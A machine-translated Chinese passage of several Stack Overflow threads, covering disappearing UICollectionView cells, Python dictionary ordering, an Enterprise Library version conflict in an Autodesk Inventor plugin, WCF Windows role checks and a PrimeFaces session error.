我们最近遇到了消失的单元格，发现我们不小心插入了 0x0 大小的单元格，而不是跳过“隐藏”的单元格。由此产生的行为非常令人困惑，并不表明这些不可见的细胞是问题所在。我们会看到大小正确的单元格和布局，但一些有效的单元格会在屏幕滚动后始终消失。我不知道为什么混合 0 大小的单元格会导致这种行为，但删除它们可以解决问题。这可能不会导致您的问题，但这可能有助于开发人员搜索类似症状。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2018-10-30T13:08:06.137

当我突然遇到同样的问题并花了一些时间找出滚动过程中单元格消失的可能原因之一时，我也会添加我的答案。

### 问题的先决条件：

1.  你有一个`UICollectionView`实例
2.  你有一个`UICollectionViewFlowLayoutSubclass`

### 问题

滚动到特定点后，单元格从集合视图中消失。

### 问题的根源在于`UICollectionViewFlowLayout`.

[正如它在文档](https://developer.apple.com/documentation/uikit/uicollectionviewlayout)中明确指出的那样：

> 每个布局对象都应该实现以下方法：

```
- collectionViewContentSize
- layoutAttributesForElements(in:)
- layoutAttributesForItem(at:)
- layoutAttributesForSupplementaryView(ofKind:at:) // (if your layout supports -supplementary views)
-layoutAttributesForDecorationView(ofKind:at:) // (if your layout supports decoration views)
- shouldInvalidateLayout(forBoundsChange:) 
```

通过依赖`UICollectionViewFlowLayout`上述方法的实现，我们错过了这样一个事实，即`func layoutAttributesForElements(in rect: CGRect)`会`collectionViewContentSize`生成错误的**contentSize**（如果所有单元格都具有`itemSize`大小并且内容大小将是对应的，则该大小将是正确的。一旦滚动`offsetY`将大于`contentSize`高度单元格都会消失。

### 解决方案

解决方案是适当的`UICollectionViewFlowLayout`子类化。覆盖所有[需要覆盖](https://developer.apple.com/documentation/uikit/uicollectionviewlayout)的方法，一切都会正常工作。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2019-11-28T00:05:20.940

刚刚遇到了一个问题，即所有 UICollectionView 单元格在滚动时都消失了。

发生这种情况是因为我已经宣布

```
extension UICollectionViewLayout {
    static let defaultLayout: UICollectionViewLayout {
        let layout = UICollectionViewFlowLayout()
        layout.estimatedItemSize = UICollectionViewFlowLayout.automaticSize
        return layout
    }()
} 
```

...意味着在多个 UICollectionView 中使用了相同的布局实例。我本来打算把它变成一个计算变量。希望这可以帮助那些不小心在多个集合视图中使用相同布局对象的人。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-03-16T14:17:06.383

在我的情况下，导致单元格消失的原因是数据源被过早地释放。`UICollectionView.dataSource`是一个弱属性，这意味着除非您保持对它的强引用，否则该对象将在您创建的范围结束时被释放。当我点击`UICollectionView`.

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2017-08-11T13:21:29.830

对我来说，这个问题似乎与我让我的 collectionview 适应打开的键盘以防止内容重叠的方式有关。

在我的观察者中回应 KeyboardWillShow 我有这个：

```
var userInfo = obj.UserInfo[UIKeyboard.FrameEndUserInfoKey];
if (userInfo is NSValue value)
{
    var rect = value.CGRectValue;
    var windowOffset = this.Superview.ConvertPointToView(this.Frame.Location, UIApplication.SharedApplication.KeyWindow);
    var newHeight = rect.Y - windowOffset.Y;

    this._controller.CollectionView.Frame = new CGRect(0, 0, this._controller.CollectionView.Frame.Width, newHeight);
} 
```

改成这样后：

```
var userInfo = obj.UserInfo[UIKeyboard.FrameBeginUserInfoKey];
if (userInfo is NSValue value)
{
    var rect = value.CGRectValue;
    UIEdgeInsets contentInsets = new UIEdgeInsets(0, 0, rect.Height, 0);
    this._controller.CollectionView.ContentInset = contentInsets;
    this._controller.CollectionView.ScrollIndicatorInsets = contentInsets;
} 
```

细胞消失的问题完全消失了。这是与 xamarin 合作的 C#，但我希望它对其他人有所帮助。

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2017-09-08T03:52:52.833

我认为这不是 UICollectionView 的错误，也许您没有在`- (NSArray *)layoutAttributesForElementsInRect:(CGRect)rect`方法中返回正确的数据。

你可以看到这个演示：[https](https://github.com/lqcjdx/YLTagsChooser) ://github.com/lqcjdx/YLTagsChooser ，所有的单元格都可以在滑动 UICollectionView 时出现。

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2021-03-05T09:24:53.657

在我的情况下，单元格消失的问题是由于在项目中添加了 IQKeyboardManager SDK。因为这个SDK在整个项目中触发了键盘动画，即使你不直接将它添加到单独的文件中。

对我来说奇怪的是，只有当您为集合视图添加 UIEdgeInset 时才会出现问题，在我的情况下，该值高于 .bottom 的 40。

如何解决？你需要解锁 pod 文件并添加

```
DispatchQueue.main.async {} 
```

对于这个动画。如果是 UICollectionViewController 它的内部

```
@objc internal func keyboardWillHide(_ notification: Notification?) {} 
```

带线的方法

```
 if let lastScrollView = lastScrollView {} 
```

当您为此动画添加主队列时，问题消失。

# python - 奇怪的字典迭代顺序

> ID：13360976
> 
> 赞同：2
> 
> 时间：2012-11-13T12:42:05.530
> 
> 标签：python, dictionary

> **可能重复：**
> [为什么 python 像这样订购我的字典？](https://stackoverflow.com/questions/526125/why-is-python-ordering-my-dictionary-like-so)

我有这个完全工作的代码，但它的行为很奇怪：字典中的项目不是按顺序迭代的，而是以某种方式随机迭代的，这是为什么呢？：

```
#!/usr/bin/python

newDict = {}
lunar = {'a':'0','b':'0','c':'0','d':'0','e':'0','f':'0'}
moon = {'a':'1','d':'1','c':'1'}

for il, jl in lunar.items():
    print "lunar: " + il + "." + jl 
    for im, jm in moon.items():
        if il == im:
            newDict[il] = jm
            break
        else:
            newDict[il] = jl

print newDict 
```

输出：

```
lunar: a.0
lunar: c.0
lunar: b.0
lunar: e.0  
lunar: d.0
lunar: f.0
{'a': '1', 'c': '1', 'b': '0', 'e': '0', 'd': '1', 'f': '0'} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T12:42:54.703

字典不保存输入顺序。`OrderedDict`您可以从集合模块尝试类 - [OrderedDict 示例和食谱](http://docs.python.org/2/library/collections.html#collections.OrderedDict)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-13T12:44:20.623

Python`dict`未排序。出于性能原因，实现忘记添加项目的顺序会更有效。

正如[文档所述](http://docs.python.org/2/library/stdtypes.html#dict.items)：

> 键和值以非随机的任意顺序列出，在 Python 实现中有所不同，并且取决于字典的插入和删除历史。

如果你需要一个有序的字典，你可以使用[`OrderedDict`](http://docs.python.org/2/library/collections.html#collections.OrderedDict).

# c# - 一个进程中的不同版本的企业库

> ID：13360984
> 
> 赞同：7
> 
> 时间：2012-11-13T12:42:59.573
> 
> 标签：c#, .net, plugins, enterprise-library, autodesk

我们正在为 Autodesk Inventor 开发一个插件。我们的软件是在运行时加载到 Inventor 中的一堆 dll 程序集。我们决定使用 Microsoft Enterprise Library 5.0 进行日志记录和异常处理。

现在我们遇到了一个问题，因为事实证明 Inventor 2013 使用的是 Enterprise Library 4.1。当我们的加载项加载时，它无法加载正确版本的程序集，因为 Inventor 的 Bin 目录中已经有一个旧版本。

到目前为止我们考虑过的选项：

1.  在我们的产品部署期间，覆盖 Inventor 的 Bin 文件夹中的旧库
2.  在我们的程序集中使用 EL 4.1

两者都很糟糕，我的想法已经不多了，所以我正在寻求帮助。

选项 1 提出了这个问题：企业库是否向后兼容，替换 Bin 文件夹中的那些 DLL 会导致问题吗？我已经尝试过了，Inventor 没有抱怨并且按预期工作（没有检查 EL 功能）。

选项 2 让我们使用旧版本并将我们绑定到 Autodesk 正在使用的版本，因此我们必须注意他们何时升级，尤其是当他们发布新版本的 Inventor 时。

在这种情况下，最佳做法是什么？

**更新：**
我们通过将较新版本的企业库放入 GAC 中解决了这个问题。我认为这里发生的事情是 .NET 尝试首先加载旧版本（因为它在程序集搜索顺序中更高）并且在失败后再也没有进一步寻找合适的版本。在 GAC 中，它可以正确解析。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-14T11:02:51.463

据我所知，一个合理的解决方案是嵌入程序集并使用 ResourceManager 类访问它们，这将允许您使用较新的版本，同时维护父项目的日志记录机制。

您可能会发现这个问题很有用： [在另一个程序集中嵌入程序集](https://stackoverflow.com/questions/222655/embedding-assemblies-inside-another-assembly)

# wcf - 如何使用角色 - 仅当用户名参数与当前 Windows 标识中的用户名匹配时才支持该方法

> ID：13360995
> 
> 赞同：1
> 
> 时间：2012-11-13T12:43:52.720
> 
> 标签：wcf

我已经设法使用此 .config 使 Windows 身份验证与服务调用一起工作：

```
<?xml version="1.0"?>

<!--
  For more information on how to configure your ASP.NET application, please visit
  http://go.microsoft.com/fwlink/?LinkId=169433
  -->

<configuration>

  <system.web>
    <compilation debug="true" targetFramework="4.0" />

    <authentication mode="Forms">
      <forms loginUrl="~/Account/Login.aspx" timeout="2880" />
    </authentication>

    <membership>
      <providers>
        <clear/>
        <add name="AspNetSqlMembershipProvider" type="System.Web.Security.SqlMembershipProvider" connectionStringName="ApplicationServices"
             enablePasswordRetrieval="false" enablePasswordReset="true" requiresQuestionAndAnswer="false" requiresUniqueEmail="false"
             maxInvalidPasswordAttempts="5" minRequiredPasswordLength="6" minRequiredNonalphanumericCharacters="0" passwordAttemptWindow="10"
             applicationName="/" />
      </providers>
    </membership>

    <profile>
      <providers>
        <clear/>
        <add name="AspNetSqlProfileProvider" type="System.Web.Profile.SqlProfileProvider" connectionStringName="ApplicationServices" applicationName="/"/>
      </providers>
    </profile>

    <roleManager enabled="false">
      <providers>
        <clear/>
        <add name="AspNetSqlRoleProvider" type="System.Web.Security.SqlRoleProvider" connectionStringName="ApplicationServices" applicationName="/" />
        <add name="AspNetWindowsTokenRoleProvider" type="System.Web.Security.WindowsTokenRoleProvider" applicationName="/" />
      </providers>
    </roleManager>

  </system.web>

  <system.webServer>
     <modules runAllManagedModulesForAllRequests="true"/>
  </system.webServer>
  <system.serviceModel>

    <bindings>

      <wsHttpBinding>
        <binding name="Unsecured">
          <security mode="None"/>
        </binding>

        <binding name="Secured">
          <security mode="Message">
            <message clientCredentialType="Windows"/>
          </security>
        </binding>
      </wsHttpBinding>

    </bindings>

    <services>
      <service behaviorConfiguration="ServiceBehaviour" name="WebApplication.SecureService">
        <endpoint address="" binding="wsHttpBinding" bindingConfiguration="Secured" contract="WebApplication.ISecureService" />
        <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange" />
      </service>
    </services>

    <behaviors>
      <serviceBehaviors>
        <behavior name="ServiceBehaviour">
          <serviceMetadata httpGetEnabled="true" />
          <serviceDebug includeExceptionDetailInFaults="true" />
          <serviceCredentials>
            <userNameAuthentication userNamePasswordValidationMode="Windows"/>
          </serviceCredentials>
        </behavior>
      </serviceBehaviors>
    </behaviors>
    <serviceHostingEnvironment multipleSiteBindingsEnabled="true" />
  </system.serviceModel>

</configuration> 
```

在服务中，我可以看到谁使用以下方式登录：

```
OperationContext.Current.ServiceSecurityContext.PrimaryIdentity; 
```

我想检查用户是否是特定角色的成员，所以我尝试启用以下`roleManager`功能：

```
 <roleManager enabled="true" defaultProvider="AspNetWindowsTokenRoleProvider">
      <providers>
        <clear/>
        <add name="AspNetWindowsTokenRoleProvider" type="System.Web.Security.WindowsTokenRoleProvider" applicationName="/" />
      </providers>
    </roleManager> 
```

然后使用检查角色`Roles`

```
Roles.IsUserInRole(@"DOMANIN\Role");
or:
var id = OperationContext.Current.ServiceSecurityContext.PrimaryIdentity;
Roles.IsUserInRole(id.Name, @"DOMANIN\Role"); 
```

但两者都抛出异常：

“仅当用户名参数与当前 Windows 标识中的用户名匹配时，才支持该方法。”

此外，如果有一个属性来检查角色，那将是理想的，因为它会抛出正确的异常，而不是我自己处理它。

**更新**

我刚试过这个：

```
if (Roles.RoleExists(@"DOMANIN\Role")) 
```

并得到了一个不同的例外：

“配置的角色提供程序 (WindowsTokenRoleProvider) 依赖于 Windows 身份验证来确定允许用户成为成员的组。ASP.NET 角色管理器不能用于管理 Windows 用户和组。如果您愿意，请使用 SQLRoleProvider支持自定义用户/角色分配。” 我将谷歌搜索，只是认为它可能会帮助那些为我看这个的人。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T14:31:08.770

异常告诉您，您只能检查当前登录用户的角色。要获取字符串形式的列表，这应该适合您：

```
Roles.GetRolesForUser() 
```

但是，您无法像使用 Forms 身份验证时那样为某些任意用户获取角色。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T14:14:44.887

```
[PrincipalPermission(SecurityAction.Demand, Role = @"DOMAIN\Role")]
public string DoWork()
{
    //user is authenticated and in the role
} 
```

如果有人可以阐明例外情况，仍然会感兴趣。

即使没有`roleManager`启用如此明显的不同机制，这也有效。

# jsf-2 - 包括 Primefaces 菜单给 Can not create a session after the > response has been Committed

> ID：13360998
> 
> 赞同：0
> 
> 时间：2012-11-13T12:44:18.293
> 
> 标签：jsf-2, primefaces

我有一个包含 3 个页面的页面：菜单、页眉和页脚。当我第一次进入搜索表单时会出现此异常

> java.lang.IllegalStateException：提交响应后无法创建会话。

我删除了此页面上的通话菜单，异常消失了。还有另一种方法来处理这个吗？

我使用了 HttpSession session = request.getSession(true);，更新 mojarra 的版本，放：

```
<context-param>
  <param-name>com.sun.faces.writeStateAtFormEnd</param-name>
  <param-value>false</param-value>
</context-param> 
```

没有成功！

谢谢！